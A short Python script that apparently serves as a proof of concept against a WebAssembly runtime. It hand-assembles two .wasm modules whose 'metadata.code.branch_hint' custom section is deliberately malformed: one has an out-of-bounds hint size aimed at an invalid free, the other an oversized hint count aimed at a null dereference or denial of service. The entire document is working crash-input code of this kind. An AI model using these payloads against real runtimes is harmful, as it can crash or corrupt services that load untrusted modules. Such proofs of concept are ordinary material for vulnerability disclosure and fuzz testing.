from pathlib import Path

def u32leb(n):
    out = bytearray()
    while True:
        b = n & 0x7f
        n >>= 7
        if n:
            b |= 0x80
        out.append(b)
        if not n:
            break
    return bytes(out)
name = b"metadata.code.branch_hint"
assert len(name) == 25
def build_module(payload_tail, out_path):
    payload = b"".join([
        u32leb(len(name)),
        name,
        payload_tail
    ])
    custom_section = b"\x00" + u32leb(len(payload)) + payload
    payload_type = u32leb(1) + b"\x60" + u32leb(0) + u32leb(0)
    sec_type = b"\x01" + u32leb(len(payload_type)) + payload_type
    payload_func = u32leb(1) + u32leb(0)
    sec_func = b"\x03" + u32leb(len(payload_func)) + payload_func
    body = u32leb(0) + b"\x0b"
    payload_code = u32leb(1) + u32leb(len(body)) + body
    sec_code = b"\x0a" + u32leb(len(payload_code)) + payload_code
    module = b"\x00asm" + b"\x01\x00\x00\x00" + sec_type + sec_func + sec_code + custom_section
    Path(out_path).write_bytes(module)
payload_invalid_free = b"".join([
    b"\x01",            # numFunctionHints
    b"\x00",            # func_idx
    b"\x02",            # num_hints
    b"\x00",            # hint0 offset
    b"\x01",            # hint0 size
    b"\x00",            # hint0 data
    b"\x00",            # hint1 offset
    b"\x02",            # hint1 size (invalid)
])
build_module(payload_invalid_free, "branch_hint_invalid_free.wasm")
payload_dos = b"".join([
    b"\x01",
    b"\x00",
    b"\xff\xff\xff\xff\x0f",
])
build_module(payload_dos, "branch_hint_null_deref.wasm")